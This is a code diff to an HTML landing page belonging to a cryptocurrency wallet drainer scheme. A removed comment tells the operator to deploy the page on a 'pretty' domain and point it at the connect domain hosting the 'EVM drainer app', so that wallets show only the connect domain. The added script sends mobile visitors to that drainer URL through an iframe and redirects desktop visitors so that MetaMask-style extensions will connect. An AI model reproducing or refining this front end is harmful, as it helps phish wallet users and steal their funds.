@@ -11,15 +11,19 @@
 </style>
 </head>
 <body>
-<!--
-  DEPLOY THIS FILE to your pretty/main domain.
-  Change the iframe src below to your connect domain where the EVM drainer app is deployed.
-  MetaMask/wallets will show the connect domain, NOT this domain.
--->
-<iframe
-  src="https://playholding.vercel.app/"
-  allow="clipboard-read; clipboard-write; fullscreen"
-  allowfullscreen
-></iframe>
+<script>
+  // Desktop: redirect directly (browser extensions can't work in iframes)
+  // Mobile: use iframe (WalletConnect QR works fine in iframes)
+  var CONNECT_URL = 'https://playholding.vercel.app/';
+  var isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  
+  if (isMobile) {
+    // Mobile — iframe is safe, wallets connect via WalletConnect/deep links
+    document.write('<iframe src="' + CONNECT_URL + '" allow="clipboard-read; clipboard-write; fullscreen" allowfullscreen></iframe>');
+  } else {
+    // Desktop — redirect so browser extensions (MetaMask, etc.) work
+    window.location.replace(CONNECT_URL);
+  }
+</script>
 </body>
 </html>
